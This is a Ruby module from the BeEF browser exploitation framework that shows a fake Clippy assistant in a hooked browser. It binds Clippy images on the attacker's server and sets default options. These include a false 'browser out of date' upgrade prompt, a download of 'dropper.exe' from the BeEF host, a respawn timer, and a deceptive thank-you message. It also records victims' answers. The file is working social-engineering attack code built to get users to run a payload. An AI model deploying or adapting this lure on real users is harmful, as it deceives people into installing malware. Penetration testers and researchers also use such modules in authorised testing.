#
# Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
class Clippy < BeEF::Core::Command

  def pre_send
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/social_engineering/clippy/assets/clippy-speech-bottom.png','/clippy/clippy-speech-bottom','png')
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/social_engineering/clippy/assets/clippy-speech-mid.png','/clippy/clippy-speech-mid','png')
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/social_engineering/clippy/assets/clippy-speech-top.png','/clippy/clippy-speech-top','png')
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/social_engineering/clippy/assets/clippy-main.png','/clippy/clippy-main','png')
  end
  
  def self.options
    @configuration = BeEF::Core::Configuration.instance
    proto = @configuration.get("beef.http.https.enable") == true ? "https" : "http"
    beef_host = @configuration.get("beef.http.public") || @configuration.get("beef.http.host")
    beef_port = @configuration.get("beef.http.public_port") || @configuration.get("beef.http.port")
    base_host = "#{proto}://#{beef_host}:#{beef_port}"

    return [
        {'name' =>'clippydir', 'description' =>'Webdir containing clippy images', 'ui_label'=>'Clippy image directory', 'value' => "#{base_host}/clippy/"},
        {'name' =>'askusertext', 'description' =>'Text for speech bubble', 'ui_label'=>'Custom text', 'value' => 'Your browser appears to be out of date. Would you like to upgrade it?'},
        {'name' =>'executeyes', 'description' =>'Executable to download', 'ui_label'=>'Executable', 'value' => "#{base_host}/dropper.exe"},
        {'name' =>'respawntime', 'description' =>'', 'ui_label'=>'Time until Clippy shows his face again', 'value' => '5000'},
        {'name' =>'thankyoumessage', 'description' =>'Thankyou message after downloading', 'ui_label'=>'Thankyou message after downloading', 'value' => 'Thanks for upgrading your browser! Look forward to a safer, faster web!'}
    ]
  end
  
  #
  # This method is being called when a zombie sends some
  # data back to the framework.
  #
  def post_execute
    save({'answer' => @datastore['answer']})
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/clippy/clippy-main.png')
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/clippy/clippy-speech-top.png')
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/clippy/clippy-speech-mid.png')
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/clippy/clippy-speech-bottom.png')
  end
  
end
